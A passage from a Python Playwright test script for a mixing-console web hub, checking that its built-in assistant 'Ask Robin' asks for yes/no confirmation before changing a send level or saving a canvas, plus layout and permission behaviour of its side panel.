        await ask.locator(".theirs", has_text="Nothing looks wrong.").wait_for(timeout=8000)
        check("come back to, the conversation is still there", await ask.locator(".mine").count() == 1 and await ask.locator("#fresh").is_visible())
        await ask.locator("#fresh").click()
        await ask.locator(".start").wait_for()
        check("Start over empties it", await ask.locator(".mine, .theirs").count() == 0)
        # --- Having it do something: it asks, in the hub's words, and only a yes does it ---
        await owner.goto(base + "/admin/people"); await owner.wait_for_selector("#people .item")
        await robin.get_by_role("button", name="Assign").click()
        await owner.fill("#slot_ears", "1"); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        level = lambda: json.loads(urllib.request.build_opener(urllib.request.ProxyHandler({})).open(urllib.request.Request(base + "/api/state?plugin=sim-console", headers={"cookie": owner_cookie})).read())["console/input/1/bus/1/level"]
        owner_cookie = "; ".join(f"{c['name']}={c['value']}" for c in await owner_ctx.cookies())
        before = level()
        await owner.goto(base + "/s/ask")
        ask = owner.frame_locator("#screen")
        await ask.locator("#name", has_text="Ask Robin").wait_for(timeout=8000)
        await ask.locator("#q").fill("Set input 1 in bus 1 to -7.5"); await ask.locator("#send").click()
        await ask.locator(".yesno").wait_for(timeout=15000)
        card = await ask.locator(".yesno").inner_text()
        check("asked to change something, it stops and the hub asks yes or no, showing exactly what would change", "Set Send level (console/input/1/bus/1/level) on Simulated board to -7.5 dB?" in card and "Yes, do it" in card and await ask.locator("#q").is_disabled() and level() == before, card)
        if shots: await owner.screenshot(path=f"{shots}/16-ask-yes-or-no.png")
        await ask.locator(".yesno button.no").click()
        await ask.locator(".theirs", has_text="The person said no").wait_for(timeout=15000)
        await ask.locator("#send", has_text="Ask").wait_for()
        check("No, and nothing is changed", level() == before and "Not done: you said no" in await ask.locator("#talk").inner_text())
        await ask.locator("#q").fill("Set input 1 in bus 1 to -7.5"); await ask.locator("#q").press("Enter")
        await ask.locator(".yesno").wait_for(timeout=15000)
        await ask.locator(".yesno button", has_text="Yes, do it").click()
        await ask.locator(".theirs", has_text="it was done").wait_for(timeout=15000)
        await ask.locator("#send", has_text="Ask").wait_for()
        said = await ask.locator("#talk").inner_text()
        check("Yes, and it is done: the board holds it and the screen says so", before != -7.5 and level() == -7.5 and "You said yes." in said and "Done: it is now -7.5" in said, f"{level()} {said}")
        if shots: await owner.screenshot(path=f"{shots}/17-ask-done.png")

        # --- Ask opens beside the screen you are on, from a word in the bar ---
        await owner.set_viewport_size({"width": 390, "height": 844})
        await owner.goto(base + "/s/one-fader")
        link = owner.locator("#besides a", has_text="Ask")
        await link.wait_for()
        await owner.click("#who")
        places = await owner.locator("#links a").all_inner_texts()
        await owner.click("#who")
        check("Ask is a word in the bar and not one of the places to go, and the way to the settings is called Skillfully Config", "Ask" not in places and "Skillfully Config" in places and await owner.locator("#beside").is_hidden(), str(places))
        await link.click()
        beside = owner.frame_locator("#besideFrame")
        await beside.locator("#name", has_text="Ask Robin").wait_for(timeout=8000)
        fader = owner.frame_locator("#screen")
        box_s = await owner.locator("#screen").bounding_box(); box_b = await owner.locator("#beside").bounding_box()
        check("opened, it is below the screen on a phone, and the screen is still whole and still there", await link.get_attribute("aria-expanded") == "true" and box_s["height"] > 150 and abs(box_s["y"] + box_s["height"] - box_b["y"]) < 2 and box_b["y"] + box_b["height"] <= 845 and await fader.locator("#fader").is_visible(), f"{box_s} {box_b}")
        await beside.locator("#q").fill("Is anything not working?"); await beside.locator("#q").press("Enter")
        await beside.locator(".theirs", has_text="Nothing looks wrong.").wait_for(timeout=15000)
        await beside.locator("#send", has_text="Ask").wait_for()
        if shots: await owner.screenshot(path=f"{shots}/18-ask-beside-phone.png")
        # The screen beside it is still live: its own connection, its own values.
        check("the screen it is beside still works while it is open", await fader.locator("#led.on").count() == 1)
        await owner.goto(base + "/s/canvas")
        beside = owner.frame_locator("#besideFrame")
        await beside.locator(".theirs", has_text="Nothing looks wrong.").wait_for(timeout=8000)
        check("gone to another screen, it is still open and the conversation is still there", await owner.locator("#beside").is_visible() and "Is anything not working?" in await beside.locator(".mine").last.inner_text())
        await owner.set_viewport_size({"width": 1200, "height": 800})
        box_s = await owner.locator("#screen").bounding_box(); box_b = await owner.locator("#beside").bounding_box()
        check("with room, it is to the right of the screen", abs(box_b["width"] - 400) < 2 and abs(box_s["x"] + box_s["width"] - box_b["x"]) < 2 and abs(box_s["height"] - box_b["height"]) < 2, f"{box_s} {box_b}")
        if shots: await owner.screenshot(path=f"{shots}/19-ask-beside-wide.png")
        await owner.click("#besideClose")
        check("Close puts it away, hands the keyboard back to its word in the bar, and nothing is left running in it", await owner.locator("#beside").is_hidden() and await owner.evaluate("document.activeElement.textContent") == "Ask" and await owner.evaluate("document.getElementById('besideFrame').src") == "about:blank")
        await owner.reload()
        await owner.locator("#besides a", has_text="Ask").wait_for()
        check("closed, it stays closed", await owner.locator("#beside").is_hidden())
        await owner.set_viewport_size({"width": 390, "height": 844})
        sam_bar = await (await sam_ctx.new_page()).goto(base + "/s/one-fader")
        sam_page = sam_ctx.pages[-1]
        await sam_page.wait_for_function("document.getElementById('who').textContent !== 'Menu'")
        check("someone who was not given Ask has no such word in their bar", await sam_page.locator("#besides a").count() == 0)
        await sam_page.close()

        # --- The agent draws a canvas: it is on Canvas to look at before the yes, and kept only after it ---
        made = await owner.evaluate("""async () => (await (await fetch('/admin/api/role', {method: 'POST', headers: {'content-type': 'application/json'}, body: JSON.stringify({role: {name: 'Draws canvases', grants: {canvas: ['see', 'use', 'arrange']}}})})).json()).ok""")
        await owner.goto(base + "/admin/people"); await owner.wait_for_selector("#people .item")
        await robin.get_by_role("button", name="Roles").click()
        await owner.locator("#dlgBody label.check", has_text="Draws canvases").locator("input").check()
        await ok_dialog()
        await owner.set_viewport_size({"width": 1200, "height": 800})
        await owner.goto(base + "/s/canvas")
        await owner.locator("#besides a", has_text="Ask").click()
        beside = owner.frame_locator("#besideFrame"); canvas_f = owner.frame_locator("#screen")
        await beside.locator("#name", has_text="Ask Robin").wait_for(timeout=8000)
        await beside.locator("#q").fill("Make a canvas with input 1 on it"); await beside.locator("#q").press("Enter")
        await beside.locator(".yesno").wait_for(timeout=15000)
        await canvas_f.locator("#proposedNote").wait_for(timeout=8000)
        card = await beside.locator(".yesno").inner_text()
        check("asked to make a canvas, the hub asks yes or no, and Canvas beside it shows what was drawn, marked as not saved", made and "Keep “drawn-by-robin” in Canvas? It is new." in card and "Not saved yet" in await canvas_f.locator("#proposedNote").inner_text() and "Drawn by Robin" in await canvas_f.locator("#board").inner_text() and await canvas_f.locator("#name").inner_text() == "Drawn by Robin", card)
        check("what is shown before the yes cannot be pressed, and cannot be arranged", await canvas_f.locator("#board").get_attribute("inert") is not None and await canvas_f.locator("#arrange").is_hidden())
        if shots: await owner.screenshot(path=f"{shots}/20-canvas-proposed.png")
        await beside.locator(".yesno button", has_text="Yes, do it").click()
        await beside.locator(".theirs", has_text="it was kept").wait_for(timeout=15000)
        await canvas_f.locator("#proposedNote").wait_for(state="hidden")
        await canvas_f.locator("#arrange").wait_for()
        check("after the yes it is a canvas like any other: shown, live, and theirs to arrange", (await canvas_f.locator("#pick").is_visible() or await canvas_f.locator("#name").is_visible()) and await beside.locator(".waiting.done").inner_text() == "You said yes." and "Drawn by Robin" in await canvas_f.locator("#board").inner_text() and await canvas_f.locator("#board").get_attribute("inert") is None and "Saved “drawn-by-robin” in Canvas" in await beside.locator("#talk").inner_text())
        if shots: await owner.screenshot(path=f"{shots}/21-canvas-kept.png")
        await owner.click("#besideClose")
        await owner.set_viewport_size({"width": 390, "height": 844})

        sam_screens = [s["id"] for s in (await (await sam_ctx.request.get(base + "/auth/me")).json()).get("screens", [])]
        check("someone who was not given the ability has no Ask screen", "ask" not in sam_screens and len(sam_screens) > 0, str(sam_screens))

        check("no page errors", not unexpected, "; ".join(unexpected))
        await b.close()

asyncio.run(main())
print(f"\n{sum(results)} of {len(results)} checks passed")
sys.exit(0 if all(results) else 1)
